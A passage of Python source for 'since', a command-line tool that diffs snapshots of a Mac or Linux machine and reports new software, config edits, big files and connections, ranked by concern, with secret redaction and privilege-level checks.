                + paint(f"({clean(val[0])} → {clean(val[1])})", "dim"))
    return f"{verb} {f['label'].lower()}: {paint(clean(tilde(f['key'])), 'bold')}"


def render(findings, baseline, current, big_files, growing, include_quiet=False, notes=()) -> str:
    L: list[str] = []
    base_dt = datetime.fromisoformat(baseline["created"])
    cur_dt = datetime.fromisoformat(current["created"])
    span = human_duration(current["epoch"] - baseline["epoch"])
    L.append(paint("since — what changed on this computer", "bold"))
    L.append(paint(f"baseline {base_dt:%a %d %b %H:%M}  →  now {cur_dt:%a %d %b %H:%M}   ({span})", "dim"))
    for n in notes:
        L.append(paint(f"note: {n}", "yellow"))

    # A finding is "loud" (ranked, shown first) if it's a structurally-alerting
    # category, a system-file edit, OR anything escalated to ORANGE+ (e.g. an
    # unsigned app in the inventory-tier Applications category — previously it
    # rendered as a benign green "+ installed" line with no warning at all).
    def _is_loud(f):
        return (f["category"] == "config"
                or CAT.get(f["category"], {}).get("tier") == "loud"
                or f["level"] >= ORANGE)
    loud = [f for f in findings if _is_loud(f)]
    loud_ids = {id(f) for f in loud}
    inv = [f for f in findings if CAT.get(f["category"], {}).get("cls") == "software"
           and id(f) not in loud_ids]
    quiet = [f for f in findings if CAT.get(f["category"], {}).get("tier") == "quiet"
             and id(f) not in loud_ids]

    # ---- ranked "worth a look" ----
    if loud:
        worst = max(f["level"] for f in loud)
        head = {RED: "🚨 Worth a look — right now", ORANGE: "⚠  Worth a look",
                YELLOW: "Worth a glance", GREEN: "Changes"}[worst]
        L.append("")
        L.append(paint(head, LEVEL_COLOR[worst] if worst else "cyan"))
        for f in loud:
            dot = paint(LEVEL_DOT[f["level"]], LEVEL_COLOR[f["level"]])
            L.append(f"  {dot} {_describe(f)}")
            if f.get("trust"):
                tcol = "red" if f["level"] == RED else "dim"
                L.append("      " + paint(f"signature: {clean(f['trust'])}", tcol))
            if f.get("why"):
                L.append("      " + paint(f"why: {clean(redact(f['why']))}", "dim"))
            if f["category"] == "config" and f.get("diff"):
                for line in f["diff"][:12]:
                    safe = clean(redact(line))  # redact secrets, then strip escapes
                    if line.startswith("+"):
                        L.append("      " + paint(safe, "green"))
                    elif line.startswith("-"):
                        L.append("      " + paint(safe, "red"))
                    elif line.startswith("@@"):
                        L.append("      " + paint(safe, "dim"))
                if len(f["diff"]) > 12:
                    L.append(paint(f"      … {len(f['diff']) - 12} more changed lines", "dim"))
            if f.get("undo"):
                # clean() for terminal safety; the command stays shell-safe because
                # every interpolated value was shlex-quoted when the hint was built.
                L.append("      " + paint(f"undo: {clean(f['undo'])}", "dim"))

    # ---- software inventory (compact) ----
    if inv:
        L.append("")
        L.append(paint("Software", "cyan"))
        CAP = 40  # don't dump hundreds of lines on a big upgrade wave
        for f in sorted(inv, key=lambda x: (x["category"], x["key"]))[:CAP]:
            key = clean(f["key"])
            if f["action"] == "added":
                line = "  " + paint("+ installed  ", "green") + key + \
                       (f" {clean(f['value'])}" if f["category"] in ("brew", "npm_global", "pip") else "")
                if f.get("why"):
                    line += paint(f"   (from: {clean(redact(f['why']))})", "dim")
                L.append(line)
            elif f["action"] == "changed" and isinstance(f["value"], tuple):
                L.append("  " + paint("~ updated    ", "yellow") + f"{key} " +
                         paint(f"{clean(f['value'][0])} → {clean(f['value'][1])}", "dim"))
            else:
                L.append("  " + paint("- removed    ", "red") + key)
        if len(inv) > CAP:
            L.append(paint(f"  … +{len(inv) - CAP} more software changes", "dim"))

    # ---- disk ----
    if big_files or growing:
        L.append("")
        L.append(paint("Disk — big new files", "cyan"))
        for size, path in big_files:
            L.append(f"  {human_size(size):>9}  {clean(path)}")
        if growing:
            L.append(paint("  fastest-growing folders:", "dim"))
            for size, d in growing:
                L.append(f"    +{human_size(size):>8}  {clean(d)}")
        L.append(paint("  (visible folders only — hidden/app-data dirs like ~/Library are skipped)", "dim"))

    if quiet:
        L.append("")
        L.append(paint("Outbound connections (noisy — shown because --all)", "cyan"))
        for f in quiet:
            v = "started connecting out" if f["action"] == "added" else "stopped"
            L.append(f"  {paint(LEVEL_DOT[GREEN],'dim')} {clean(f['key'])} {paint(v,'dim')}")

    if len([x for x in L if x]) <= 2 + len(notes):
        L.append("")
        if any("comparison skipped" in n for n in notes):
            L.append(paint("No changes in what could be compared — but see the note(s) above: "
                           "at least one category could NOT be compared.", "yellow"))
        else:
            L.append(paint("Nothing changed. 🎉", "green"))

    if not IS_ROOT:
        L.append("")
        L.append(paint("🔒 Running without sudo — listening/outbound show only your own processes, "
                       "and /etc/sudoers isn't watched.", "dim"))
        L.append(paint("   Full system coverage:  sudo since       Details:  since caps", "dim"))
    return "\n".join(L).rstrip() + "\n"


def platform_note() -> str | None:
    """macOS and Linux are supported. Anything else runs with most collectors
    inactive — say so, so a "nothing changed" isn't mistaken for a clean bill."""
    if PLATFORM in ("macos", "linux"):
        return None
    return (f"UNSUPPORTED PLATFORM ({PLATFORM}): only shell-rc/hosts/cron edits and big "
            "new files are tracked here — most collectors are inactive, so 'nothing "
            "changed' does NOT mean your system was fully checked.")


def max_level(findings) -> int:
    return max((f["level"] for f in findings), default=GREEN)


def notify(title: str, message: str):
    if PLATFORM == "macos":
        # list-form invocation already blocks shell injection; strip quotes,
        # backslashes and control chars so a crafted name can't break/garble the
        # AppleScript string (a trailing "\" would escape the closing quote).
        msg = clean(message).replace("\\", "").replace('"', "'")[:220]
        ttl = clean(title).replace("\\", "").replace('"', "'")
        run(["osascript", "-e", f'display notification "{msg}" with title "{ttl}"'])
    elif PLATFORM == "linux":
        # notify-send: list-form (no shell), "--" ends option parsing so a name
        # starting with "-" can't be read as a flag; clean() strips controls.
        # No-ops silently on a headless box (no DBus/display) — that's fine.
        run(["notify-send", "--", clean(title), clean(message)[:220]])


# ---------------------------------------------------------------------------
# commands
# ---------------------------------------------------------------------------

def _snap_and_report(label=None, quiet_msg=False):
    snap = take_snapshot()
    path = save_snapshot(snap, label=label)
    n = sum(len(v) for v in snap["collectors"].values())
    if not quiet_msg:
        tag = f" as '{label}'" if label else ""
        print(f"Snapshot saved{tag}: {path.name}  ({n} items, {len(snap['collectors'])} categories)")
        pn = platform_note()
        if pn:
            print(paint("  " + pn, "yellow"))
        real_errs = {k: v for k, v in snap["errors"].items() if "no backend" not in v}
        if real_errs:
            print(paint(f"  note: collector issue(s): {', '.join(real_errs)}", "dim"))
    return snap, path


def cmd_snapshot(args):
    _snap_and_report()

def cmd_mark(args):
    if not args.label:
        print("usage: since mark <label>")
        return 2
    _snap_and_report(label=args.label)

def cmd_ack(args):
    _snap_and_report()
    print("Acknowledged current state as normal — future diffs start from here.")

def cmd_ignore(args):
    if args.list or not args.pattern:
        rules = load_ignores()
        if not rules:
            print("No ignore rules. Add one:  since ignore 'listening:com.docker*'")
        else:
            print("Ignore rules:")
            for cat, pat in rules:
                print(f"  {cat}: {pat}")
        return
    # Private state dir/file even when `ignore` is the very first command run (before
    # any snapshot). mkdir(exist_ok) won't tighten a pre-existing 0755 dir, so chmod too.
    STATE_DIR.mkdir(parents=True, exist_ok=True, mode=0o700)
    try:
        STATE_DIR.chmod(0o700)
    except Exception:
        pass
    with open(IGNORE_FILE, "a") as fh:
        fh.write(args.pattern.strip() + "\n")
    try:
        os.chmod(IGNORE_FILE, 0o600)
    except Exception:
        pass
    print(f"Ignoring: {args.pattern}")

def cmd_caps(args):
    who = run(["whoami"]).strip() or str(EUID)
    print(paint("since — coverage & privileges", "bold"))
    print(f"Running as: {who} " + (paint("(root — full coverage)", "green") if IS_ROOT
                                    else paint("(not root)", "yellow")))
    print()
    print(paint("Fully covered without sudo:", "cyan"))
    if PLATFORM == "linux":
        print("  autostart · enabled services/init · kernel modules · browser extensions · DNS")
        print("  · packages (apt/dnf/snap/flatpak, npm, pip) · system files · big new files")
        feats = [("Listening services", "ss shows only your own sockets; other users'/system listeners are hidden", "partial"),
                 ("Outbound connections", "same — process info for other users' sockets needs root", "partial"),
                 ("/etc/sudoers", "unreadable as a normal user, so edits to it aren't monitored", "missing")]
    else:
        print("  login items · startup jobs · kernel/browser/system extensions · DNS & proxy")
        print("  · software (brew/npm/pip/apps/App Store) · system files · big new files")
        feats = ROOT_FEATURES
    print()
    print(paint("Needs sudo for complete coverage:", "cyan"))
    for feat, why, state in feats:
        if IS_ROOT:
            tag = paint("[covered]", "green")
        else:
            tag = paint("[PARTIAL now]", "yellow") if state == "partial" else paint("[MISSING now]", "red")
        print(f"  🔒 {feat:<22} {tag}")
        print(paint(f"       {why}", "dim"))
    print()
    if IS_ROOT:
        print(paint("You're root — all of the above are covered.", "green"))
    else:
        print("For full system coverage, run:  " + paint("sudo since", "bold") +
              "   (or  sudo since digest)")
        print(paint("Note: don't mix privilege levels — a snapshot taken as root and one taken as", "dim"))
        print(paint("you aren't comparable for listening/outbound; since detects this and skips them.", "dim"))


def cmd_list(args):
    snaps = list_snapshot_paths()
    labels = {v: k for k, v in load_labels().items()}
    if not snaps:
        print("No snapshots yet. Run `since snapshot` (or just `since`).")
        return
    print(f"{len(snaps)} snapshot(s) in {SNAP_DIR}:")
    for p in snaps:
        s = safe_load(p)
        lab = paint(f"  [{labels[p.name]}]", "cyan") if p.name in labels else ""
        if s is None:
            print("  " + paint(f"{'(unreadable)':20}     — corrupt   {p.name}{lab}", "red"))
            continue
        n = sum(len(v) for v in s.get("collectors", {}).values())
        print(f"  {s.get('created', '?'):20}  {n:>4} items  {p.name}{lab}")

def cmd_diff(args, notify_on=False):
    try:
        baseline_path, note = resolve_baseline(args.since)
    except ValueError as e:  # unparseable --since value
        print(paint(f"since: {e}", "red"))
        return 2
    if note.startswith("error:"):  # missing checkpoint / all snapshots corrupt
        print(paint(f"since: {note[len('error:'):].strip()}", "red"))
        return 2

    current = take_snapshot()

    if baseline_path is None:
        if not args.no_save:
            path = save_snapshot(current)
            print(paint("First snapshot saved — this is your baseline.", "bold"))
            print(f"  {path}\n\nRun `since` again later to see what changed.")
            print("Tip: `since snapshot` in a daily job, or `./install.sh` to automate it.")
        else:
            print("No baseline yet and --no-save given; nothing to compare.")
        return

    baseline = safe_load(baseline_path)
    if baseline is None:
        print(paint("since: the baseline snapshot is unreadable; run `since snapshot` to reset.", "red"))
        return 2

    # Privilege guard — FAIL CLOSED. A root snapshot and a non-root one see
    # different listener/outbound sets and differ on sudoers/crontab, so comparing
    # them fabricates alarms. Skip those categories+blobs unless we can CONFIRM the
    # baseline was taken at the same privilege level. Pre-v0.3 snapshots have no
    # "root" stamp → we can't confirm → skip (previously this failed *open*).
    notes = []
    pn = platform_note()
    if pn:
        notes.append(pn)
    skip = ()
    skip_priv_blobs = False
    # Capability guard: a collector that couldn't run in ONE of the two snapshots (tool not
    # on PATH — the daily job's PATH differs from your shell's — or a timeout) would
    # otherwise report its whole category as removed/added.
    unusable = unusable_cats(baseline, current)
    lost = coverage_lost(baseline, current, unusable)
    # A skipped category must not simply VANISH: the blind snapshot still becomes tomorrow's
    # baseline, so without this an install made during the blind window is never reported by any
    # run, ever — while the report cheerfully says "Nothing changed". Fall back to the newest
    # EARLIER snapshot that could see the category with the same tool. Computed HERE, before the
    # notes below, which need to know whether a category was recovered.
    recovered = recover_baselines(current, unusable, baseline)
    if unusable:
        skip = tuple(unusable)
        for cat, why in sorted(unusable.items()):
            if cat in lost or cat in recovered:
                continue     # a ranked finding, or recovered below — either way not a bare skip
            notes.append(f"{CAT[cat]['label']}: comparison skipped — {clean(str(why))[:110]}")
    base_root = baseline.get("root")  # None on unstamped (pre-v0.3) snapshots
    if base_root is None:
        skip, skip_priv_blobs = tuple(set(skip) | set(PRIV_SENSITIVE_CATS)), True
        notes.append("baseline predates privilege stamping — listening/outbound and "
                     "sudoers/crontab comparison skipped (can't confirm same privilege).")
    elif base_root != current.get("root"):
        skip, skip_priv_blobs = tuple(set(skip) | set(PRIV_SENSITIVE_CATS)), True
        notes.append("baseline and now were taken at different privilege levels "
                     f"({'root' if base_root else 'user'} vs "
                     f"{'root' if current.get('root') else 'user'}) — "
                     "listening/outbound and sudoers/crontab comparison skipped to avoid false alarms.")

    findings = build_findings(baseline, current, coverage=lost, include_quiet=args.all,
                              skip_cats=skip, skip_priv_blobs=skip_priv_blobs)
    big, growing, big_note = find_big_new_files(baseline.get("epoch", current["epoch"]))
    if big_note:
        notes.append(big_note)

    for cat, older in sorted(recovered.items()):
        findings += build_findings(older, current, include_quiet=args.all, skip_blobs=True,
                                   skip_cats=tuple(k for k in CAT if k != cat))
        notes.append(f"{CAT[cat]['label']}: the baseline couldn't see it, so it was compared "
                     f"against the older snapshot from {clean(str(older.get('created')))[:16]}.")
    if recovered:
        findings.sort(key=lambda f: (-f["level"], f["category"], f["key"]))

    if args.json:
        # The baseline/corrupt-snapshot note (e.g. "N unreadable snapshot(s) skipped",
        # "using the oldest available") is shown to humans — surface it in --json too so
        # automation isn't silently comparing against an unexpected baseline.
        json_notes = ([note] if note and not note.startswith("error:") else []) + notes
        # redact secrets in the diff lines AND the why field so automation / logs
        # consuming --json don't receive tokens in cleartext
        json_findings = []
        for f in findings:
            g = dict(f)
            if "diff" in g:
                g["diff"] = [redact(l) for l in g["diff"]]
            if g.get("why"):
                g["why"] = redact(g["why"])
            json_findings.append(g)
        print(json.dumps({
            "baseline": baseline["created"], "now": current["created"],
            "as_root": IS_ROOT, "notes": json_notes,
            "max_level": LEVEL_NAME[max_level(findings)],
            "findings": json_findings,
            "big_new_files": [{"size": s, "path": p} for s, p in big],
            "growing_dirs": [{"bytes": s, "dir": d} for s, d in growing],
        }, indent=2, default=str))
    else:
        if note:
            print(paint(f"({note})", "dim"))
        sys.stdout.write(render(findings, baseline, current, big, growing,
                                include_quiet=args.all, notes=notes))

    if notify_on and max_level(findings) >= ORANGE:
        loud = [f for f in findings if f["level"] >= ORANGE]
        notify("since — worth a look", f"{len(loud)} change(s): " +
               "; ".join(_strip(_describe(f)) for f in loud[:3]))

    if not args.no_save:
        save_snapshot(current)


def _strip(s):
    return re.sub(r"\033\[[0-9;]*m", "", s)


def cmd_digest(args):
    cmd_diff(args, notify_on=args.notify)


def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="since", formatter_class=argparse.RawDescriptionHelpFormatter,
        description="A plain-language diff of your computer — ranked by how much you should care.",
        epilog=__doc__)
    ap.add_argument("--version", action="version", version=f"since {__version__}")
    def add_diff_flags(p):
        p.add_argument("--since", metavar="WHEN",
                       help="baseline: a time (1d, 12h, yesterday, monday, '3 hours ago') or a checkpoint label")
        p.add_argument("--no-save", action="store_true", help="don't save a new snapshot")
        p.add_argument("--json", action="store_true", help="machine-readable output")
        p.add_argument("--all", action="store_true", help="include noisy/quiet categories (outbound conns)")

    add_diff_flags(ap)  # bare `since --since ...`
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("snapshot", help="capture a snapshot without diffing")
    mk = sub.add_parser("mark", help="save a named checkpoint of now")
    mk.add_argument("label", nargs="?")
    sub.add_parser("ack", help="mark current state as normal (fresh baseline)")
    ig = sub.add_parser("ignore", help="add/list ignore rules (e.g. 'listening:com.docker*')")
    ig.add_argument("pattern", nargs="?")
    ig.add_argument("--list", action="store_true")
    sub.add_parser("list", help="list saved snapshots")
    sub.add_parser("caps", help="show what's covered and what needs sudo")
    dg = sub.add_parser("digest", help="diff and optionally notify")
    add_diff_flags(dg)
    dg.add_argument("--notify", action="store_true", help="fire a desktop notification if worth a look")

    args = ap.parse_args(argv)
    for attr, default in (("since", None), ("no_save", False), ("json", False),
                          ("all", False), ("notify", False)):
        if not hasattr(args, attr):
            setattr(args, attr, default)

    return {
        "snapshot": cmd_snapshot, "mark": cmd_mark, "ack": cmd_ack,
        "ignore": cmd_ignore, "list": cmd_list, "caps": cmd_caps, "digest": cmd_digest,
    }.get(args.cmd, cmd_diff)(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
